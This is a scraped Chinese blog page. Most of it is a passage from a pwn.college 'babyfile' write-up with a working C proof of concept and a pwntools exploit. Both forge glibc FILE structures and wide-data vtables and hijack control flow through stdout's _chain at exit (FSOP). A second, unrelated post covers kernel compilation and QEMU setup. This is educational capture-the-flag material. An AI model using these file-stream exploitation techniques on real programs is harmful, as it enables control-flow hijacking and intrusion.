class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.构造fake_wide_data,使得其偏移0xe0处的_wide_vtable指针,指向1中构造的fake_wide_vtable</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.修改FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) </span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_ptr =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_end =0;</span></span><br><span class="line">    fp-&gt;_IO_write_ptr =<span class="number">1</span>;</span><br><span class="line">    fp-&gt;_IO_write_end =<span class="number">0</span>;</span><br><span class="line">    fp-&gt;_mode=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_end =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_backup_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_end =0;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.修改FILE.vtable指向3中泄露的_IO_wfile_jumps</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = _IO_wfile_jumps;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.修改FILE._wide_data指向2中构造的fake_wide_data</span></span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.stdout指向fp</span></span><br><span class="line">    <span class="built_in">stdout</span> = fp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//7.trigger</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在win上下断点发现win确实可以调用,但是win中的puts会递归调用到win</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bt</span><br><span class="line"><span class="comment">#0  win () at stdout.c:4</span></span><br><span class="line"><span class="comment">#1  0x00007ffff7e4a5a6 in __GI__IO_wdoallocbuf (fp=fp@entry=0x4058d0) at ./libio/wgenops.c:369</span></span><br><span class="line"><span class="comment">#2  0x00007ffff7e4c2ad in __GI__IO_wfile_overflow (f=0x4058d0, wch=1668183398) at ./libio/wfileops.c:421</span></span><br><span class="line"><span class="comment">#3  0x00007ffff7e4a472 in __GI___woverflow (wch=1668183398, f=0x4058d0) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#4  __GI__IO_wdefault_xsputn (n=&lt;optimized out&gt;, data=&lt;optimized out&gt;, f=&lt;optimized out&gt;) at ./libio/wgenops.c:315</span></span><br><span class="line"><span class="comment">#5  __GI__IO_wdefault_xsputn (f=f@entry=0x4058d0, data=&lt;optimized out&gt;, n=n@entry=19) at ./libio/wgenops.c:282</span></span><br><span class="line"><span class="comment">#6  0x00007ffff7e4cecb in __GI__IO_wfile_xsputn (n=19, data=&lt;optimized out&gt;, f=0x4058d0) at ./libio/wfileops.c:1010</span></span><br><span class="line"><span class="comment">#7  __GI__IO_wfile_xsputn (f=0x4058d0, data=&lt;optimized out&gt;, n=19) at ./libio/wfileops.c:956</span></span><br><span class="line"><span class="comment">#8  0x00007ffff7e476b5 in __GI__IO_puts (str=0x402004 &quot;function win called&quot;) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#9  0x0000000000401179 in win () at stdout.c:4</span></span><br><span class="line"><span class="comment">#10 0x00007ffff7e4a5a6 in __GI__IO_wdoallocbuf (fp=fp@entry=0x4058d0) at ./libio/wgenops.c:369</span></span><br><span class="line"><span class="comment">#11 0x00007ffff7e4c2ad in __GI__IO_wfile_overflow (f=0x4058d0, wch=1668183398) at ./libio/wfileops.c:421</span></span><br><span class="line"><span class="comment">#12 0x00007ffff7e4a472 in __GI___woverflow (wch=1668183398, f=0x4058d0) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#13 __GI__IO_wdefault_xsputn (n=&lt;optimized out&gt;, data=&lt;optimized out&gt;, f=&lt;optimized out&gt;) at ./libio/wgenops.c:315</span></span><br><span class="line"><span class="comment">#14 __GI__IO_wdefault_xsputn (f=f@entry=0x4058d0, data=&lt;optimized out&gt;, n=n@entry=19) at ./libio/wgenops.c:282</span></span><br><span class="line"><span class="comment">#15 0x00007ffff7e4cecb in __GI__IO_wfile_xsputn (n=19, data=&lt;optimized out&gt;, f=0x4058d0) at ./libio/wfileops.c:1010</span></span><br><span class="line"><span class="comment">#16 __GI__IO_wfile_xsputn (f=0x4058d0, data=&lt;optimized out&gt;, n=19) at ./libio/wfileops.c:956</span></span><br><span class="line"><span class="comment">#17 0x00007ffff7e476b5 in __GI__IO_puts (str=0x402004 &quot;function win called&quot;) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#18 0x0000000000401179 in win () at stdout.c:4</span></span><br><span class="line"><span class="comment">#19 0x00007ffff7e4a5a6 in __GI__IO_wdoallocbuf (fp=fp@entry=0x4058d0) at ./libio/wgenops.c:369</span></span><br><span class="line"><span class="comment">#20 0x00007ffff7e4c2ad in __GI__IO_wfile_overflow (f=0x4058d0, wch=1668183398) at ./libio/wfileops.c:421</span></span><br><span class="line"><span class="comment">#21 0x00007ffff7e4a472 in __GI___woverflow (wch=1668183398, f=0x4058d0) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#22 __GI__IO_wdefault_xsputn (n=&lt;optimized out&gt;, data=&lt;optimized out&gt;, f=&lt;optimized out&gt;) at ./libio/wgenops.c:315</span></span><br><span class="line"><span class="comment">#23 __GI__IO_wdefault_xsputn (f=f@entry=0x4058d0, data=&lt;optimized out&gt;, n=n@entry=19) at ./libio/wgenops.c:282</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>虽然上述poc验证了这个悲剧</p>
<p>但是这个poc也给我另一个想法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//6.stdout指向fp</span></span><br><span class="line"><span class="built_in">stdout</span> = fp;</span><br></pre></td></tr></table></figure>

<p>如果在这里我们保持stdout的完整性,只是改变其后继指针<code>_chain</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//6.fp借助stdout上链</span><br><span class="line">stdout -&gt; _chain = fp;</span><br></pre></td></tr></table></figure>

<p>然后在程序退出时利用<code>FSOP</code>的机制, win就会被调用, 实验证明确实如此</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# ./stdout</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">printf</span> @ 0x7f220bf40110</span><br><span class="line">_IO_wfile_jumps @ 0x7f220c0c1268</span><br><span class="line">hello</span><br><span class="line"><span class="keyword">function</span> win called</span><br></pre></td></tr></table></figure>
</blockquote>
<p>一个<code>struct _IO_FILE_plus</code>大小是<code>0xe0 B</code>,两个就是<code>0x1c0 B</code></p>
<p>而<code>level9</code>允许我们写入<code>0x1e0 B</code>,能放开两个<code>struct _IO_FILE_plus</code>还能剩下<code>0x20 B</code>空间用于布置<code>wide_data</code>和<code>wide_vtable</code></p>
<p>溢出时<code>stdout</code>首当其冲, 我们需要保持其<code>flag </code>, <code>vtable</code>不变 , 并且给其<code>lock</code>找一个合适的地方(一个可写且值为0的地方)</p>
<p>接下来的溢出会毁坏<code>libc</code>中的一些数据, 但是不会影响到控制流, 狠狠搞坏它</p>
<p>画在图上意思意思</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241007211929871.png" alt="stdout-&gt;_chain = fake_fp"></p>
<p><strong>exp</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./babyfile_level9&quot;</span>)</span><br><span class="line"></span><br><span class="line">authenticated_addr = <span class="number">0x401866</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.泄露libc基地址</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[LEAK] The address of puts() within libc is: &#x27;</span>)</span><br><span class="line">puts_addr = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(puts_addr,<span class="number">16</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span> , puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">stdout_addr = libc_base + libc.dump(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>)</span><br><span class="line">_IO_file_jumps_addr = libc_base + libc.dump(<span class="string">&#x27;_IO_file_jumps&#x27;</span>)</span><br><span class="line">_IO_wfile_jumps_addr = libc_base + libc.dump(<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.fake_fp应该跟在stdout之后</span></span><br><span class="line">fake_fp_addr = stdout_addr + <span class="number">0xe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stdout @ &quot;</span>,<span class="built_in">hex</span>(stdout_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_fp @ &quot;</span>,<span class="built_in">hex</span>(fake_fp_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_fp_addr - stdout_addr = &quot;</span>,<span class="built_in">hex</span>(fake_fp_addr - stdout_addr))</span><br><span class="line"></span><br><span class="line">fake_wide_data_addr = fake_fp_addr + <span class="number">0xe0</span> - <span class="number">0xe0</span></span><br><span class="line">fake_IO_wdoallocbuf_addr = fake_fp_addr + <span class="number">0xe0</span> + <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_IO_wdoallocbuf_addr @ &quot;</span>,<span class="built_in">hex</span>(fake_IO_wdoallocbuf_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.构造stdout_fp,保证其flags,fileno不变</span></span><br><span class="line"><span class="comment">#lock指向一个可写值为0的地方,比如fake_fp_addr-&gt;read_buf_ptr</span></span><br><span class="line"><span class="comment">#chain指向紧跟在后边的fake_fp</span></span><br><span class="line"><span class="comment">#vtable保持使用默认的_IO_file_jumps_addr</span></span><br><span class="line">fake_stdout_fp = FileStructure()</span><br><span class="line">fake_stdout_fp.flags = <span class="number">0xfbad2887</span></span><br><span class="line">fake_stdout_fp.fileno = <span class="number">1</span></span><br><span class="line">fake_stdout_fp.chain = fake_fp_addr</span><br><span class="line">fake_stdout_fp._lock = fake_fp_addr + <span class="number">0x8</span></span><br><span class="line">fake_stdout_fp.vtable = _IO_file_jumps_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#4.构造fake_fp,</span></span><br><span class="line"><span class="comment">#根据FSOP的条件构造其成员</span></span><br><span class="line">fake_fp = FileStructure()</span><br><span class="line">fake_fp.flags = ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">0x2</span>)</span><br><span class="line">fake_fp._IO_write_ptr = <span class="number">1</span></span><br><span class="line">fake_fp._IO_write_end =<span class="number">0</span></span><br><span class="line">fake_fp._lock = fake_fp_addr + <span class="number">0x10</span></span><br><span class="line">fake_fp.vtable = _IO_wfile_jumps_addr</span><br><span class="line">fake_fp._wide_data = fake_wide_data_addr   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(fake_stdout_fp)</span><br><span class="line"><span class="built_in">print</span>(fake_fp)</span><br><span class="line"></span><br><span class="line">payload =<span class="built_in">bytes</span>(fake_stdout_fp) + <span class="built_in">bytes</span>(fake_fp) + p64(fake_IO_wdoallocbuf_addr - <span class="number">0x68</span>) + p64(authenticated_addr) +p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>相比于level8,多了一步</p>
<p>在调用wide_vtable函数时需要传递字符串参数</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/05/21/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/21/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/" class="post-title-link" itemprop="url">kernel</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-21 17:19:00" itemprop="dateCreated datePublished" datetime="2024-05-21T17:19:00+08:00">2024-05-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-07-05 17:22:59" itemprop="dateModified" datetime="2024-07-05T17:22:59+08:00">2024-07-05</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="内核调试"><a href="#内核调试" class="headerlink" title="内核调试"></a>内核调试</h1><p>[TOC]</p>
<h2 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h2><h3 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/src</span><br><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v6.x/linux-6.7.tar.gz</span><br><span class="line">tar -xzf linux-6.7.tar.gz</span><br><span class="line">cd linux-6.7</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>

<p>Kernel hakcing-&gt;</p>
<p>Compile-time checks and compiler options-&gt;</p>
<p>Debug information-&gt;Rely on the toolchain’s implicit default DWARF version</p>
<p>或者矮人4或者矮人5格式的调试信息都可以,只要是带着调试信息就可</p>
<p>配置完成之后</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j$(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure>

<p>等待编译链接完成之后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure>

<h3 id="生成文件"><a href="#生成文件" class="headerlink" title="生成文件"></a>生成文件</h3><p>内核的编译链接有三个阶段</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240222203727335.png" alt="image-20240222203727335"></p>
<h4 id="vmlinux"><a href="#vmlinux" class="headerlink" title="vmlinux"></a>vmlinux</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/linux-6.7# find . -name vmlinux</span><br><span class="line">./arch/x86/boot/compressed/vmlinux</span><br><span class="line">./vmlinux</span><br><span class="line">./tools/perf/util/bpf_skel/vmlinux  //这实际是vmlinux.h头文件</span><br></pre></td></tr></table></figure>

<p>根目录下面这个带有调试符号的linux elf,不可以作为引导内核,是第一次编译链接的产物<br /></p>
<p>linux&#x2F;arch&#x2F;x86&#x2F;boot&#x2F;compressed&#x2F;vmlinux这个是和piggy等又链接过的,并且经过了压缩</p>
<h4 id="bzImage"><a href="#bzImage" class="headerlink" title="bzImage"></a>bzImage</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/linux-6.7# find . -name bzImage</span><br><span class="line">./arch/x86/boot/bzImage</span><br><span class="line">./arch/x86_64/boot/bzImage</span><br></pre></td></tr></table></figure>

<p>真的bzImage只有一个,只不过x86_64下面这个,是x86这个的链接</p>
<p>linux&#x2F;arch&#x2F;x86&#x2F;boot&#x2F;bzImage这个是最终产物,可以引导</p>
<h4 id="vmlinuz"><a href="#vmlinuz" class="headerlink" title="vmlinuz"></a>vmlinuz</h4><p>内核编译链接完毕后,在项目根目录make install,会在&#x2F;boot&#x2F;下面生成vmlinuz-&lt;版本号&gt;</p>
<p>这个vmlinuz-&lt;版本号&gt;实际上就是bzImage</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/boot# ll /usr/src/linux-6.7/arch/x86/boot/bzImage</span><br><span class="line">-rw-r--r-- 1 root root 11801600 Feb 22 14:44 /usr/src/linux-6.7/arch/x86/boot/bzImage</span><br><span class="line">root@Destroyer:/boot# ll vmlinuz*</span><br><span class="line">-rw-r--r-- 1 root root 11801600 Feb 22 20:42 vmlinuz-6.7.0</span><br><span class="line">-rw-r--r-- 1 root root 11801600 Feb 21 20:00 vmlinuz-6.7.0.old</span><br></pre></td></tr></table></figure>

<h3 id="qemu虚拟机"><a href="#qemu虚拟机" class="headerlink" title="qemu虚拟机"></a>qemu虚拟机</h3><p>qemu的作用类似于vmware,但是可以更自由地配置,调试其上运行的内核</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://gitee.com/qemu/qemu.git</span><br><span class="line">cd qemu</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">../configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>之后就可以在任意目录使用qemu工具了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball# qemu-</span><br><span class="line">qemu-edid                      qemu-system-i386w.exe          qemu-system-riscv32w.exe</span><br><span class="line">qemu-edid.exe                  qemu-system-loongarch64.exe    qemu-system-riscv64.exe</span><br><span class="line">qemu-ga                        qemu-system-loongarch64w.exe   qemu-system-riscv64w.exe</span><br><span class="line">qemu-ga.exe                    qemu-system-m68k.exe           qemu-system-rx.exe</span><br><span class="line">qemu-img                       qemu-system-m68kw.exe          qemu-system-rxw.exe</span><br><span class="line">qemu-img.exe                   qemu-system-microblaze.exe     qemu-system-s390x.exe</span><br><span class="line">qemu-io                        qemu-system-microblazeel.exe   qemu-system-s390xw.exe</span><br><span class="line">qemu-io.exe                    qemu-system-microblazeelw.exe  qemu-system-sh4.exe</span><br><span class="line">qemu-nbd                       qemu-system-microblazew.exe    qemu-system-sh4eb.exe</span><br><span class="line">qemu-nbd.exe                   qemu-system-mips.exe           qemu-system-sh4ebw.exe</span><br><span class="line">qemu-pr-helper                 qemu-system-mips64.exe         qemu-system-sh4w.exe</span><br><span class="line">qemu-storage-daemon            qemu-system-mips64el.exe       qemu-system-sparc.exe</span><br><span class="line">qemu-storage-daemon.exe        qemu-system-mips64elw.exe      qemu-system-sparc64.exe</span><br><span class="line">qemu-system-aarch64.exe        qemu-system-mips64w.exe        qemu-system-sparc64w.exe</span><br><span class="line">qemu-system-aarch64w.exe       qemu-system-mipsel.exe         qemu-system-sparcw.exe</span><br><span class="line">qemu-system-alpha.exe          qemu-system-mipselw.exe        qemu-system-tricore.exe</span><br><span class="line">qemu-system-alphaw.exe         qemu-system-mipsw.exe          qemu-system-tricorew.exe</span><br><span class="line">qemu-system-arm.exe            qemu-system-nios2.exe          qemu-system-x86_64</span><br><span class="line">qemu-system-armw.exe           qemu-system-nios2w.exe         qemu-system-x86_64.exe</span><br><span class="line">qemu-system-avr.exe            qemu-system-or1k.exe           qemu-system-x86_64w.exe</span><br><span class="line">qemu-system-avrw.exe           qemu-system-or1kw.exe          qemu-system-xtensa.exe</span><br><span class="line">qemu-system-cris.exe           qemu-system-ppc.exe            qemu-system-xtensaeb.exe</span><br><span class="line">qemu-system-crisw.exe          qemu-system-ppc64.exe          qemu-system-xtensaebw.exe</span><br><span class="line">qemu-system-hppa.exe           qemu-system-ppc64w.exe         qemu-system-xtensaw.exe</span><br><span class="line">qemu-system-hppaw.exe          qemu-system-ppcw.exe           qemu-uninstall.exe</span><br><span class="line">qemu-system-i386.exe           qemu-system-riscv32.exe</span><br></pre></td></tr></table></figure>

<p>这里带有system字样的是为了适应不同的架构</p>
<p>有<code>qemu-system-x86_64</code>就够了</p>
<p>qemu-img是创建虚拟磁盘使用的</p>
<p>如下是用qemu启动一个虚拟机的命令</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot;</span> \</span><br><span class="line">    -smp cores=4,threads=2 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -s \</span><br></pre></td></tr></table></figure>

<p>其中</p>
<p>-m是虚拟机运行内存</p>
<p>-kernel指定内核镜像文件在本机中的地址</p>
<p><strong>-initrd指定内存文件系统,现在可以理解为磁盘</strong></p>
<p>-append是启动参数</p>
<p>-smp指定多核多线程</p>
<p>-cpu指定虚拟CPU的类型</p>
<p>-s启动调试监听,允许gdb随时远程附加调试</p>
<p>那么什么是”内存文件系统”</p>
<h3 id="内存文件系统"><a href="#内存文件系统" class="headerlink" title="内存文件系统"></a>内存文件系统</h3><p>之前有一次安装kali虚拟机时,第一次开机没有进入到桌面,而是一个(initramfs)的shell</p>
<p>意思是,操作系统内核已经起来了,但是没有挂载根文件系统rootfs</p>
<p>那么什么是内存文件系统,什么是根文件系统呢</p>
<p>首先要明确,内核离了硬盘也是能活着的,可以用其他文件系统比如网络或者内存文件系统</p>
<p>内存文件系统是内核启动过程中使用的临时文件系统,内存文件系统(initrd或者initramfs)也是一个完整的linux目录树,并且在&#x2F;bin下面有一套精简的命令工具集,比如busybox.在sbin下也有相关工具比如insmod,通常也是链接到&#x2F;bin&#x2F;busybox</p>
<p>这些工具在启动过程中可以供内核调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/busybox<span class="number">-1.36</span><span class="number">.1</span>/_install<span class="meta"># tree -L 1</span></span><br><span class="line">.</span><br><span class="line">├── bin			<span class="comment">//用户工具</span></span><br><span class="line">├── dev</span><br><span class="line">├── etc</span><br><span class="line">├── init		<span class="comment">//开机自动执行的任务脚本</span></span><br><span class="line">├── ktest.ko	</span><br><span class="line">├── linuxrc -&gt; bin/busybox</span><br><span class="line">├── proc</span><br><span class="line">├── sbin		<span class="comment">//超级管理员工具</span></span><br><span class="line">├── sys</span><br><span class="line">└── usr</span><br></pre></td></tr></table></figure>

<p>内存文件系统也存放在磁盘上,通常在&#x2F;boot&#x2F;initrd.img</p>
<p>实际上就是上述目录树打包后的归档文件</p>
<p>这就意味着,kernel开始启动之前,内存文件系统已经被解包并且搬到内存里去了</p>
<p>这就意味着,得有一个东西,它知道磁盘上的文件系统格式比如ext4,并且能正确访问到&#x2F;boot&#x2F;initrd.img,并且能解包.</p>
<p>这个东西就是grub</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启动过程:mbr-&gt;grub-&gt;kernel</span><br></pre></td></tr></table></figure>

<p>内核使用临时文件系统起来之后,临时文件系统的init脚本会规定此阶段内核应该干什么,挂载硬盘就是这时候发生的</p>
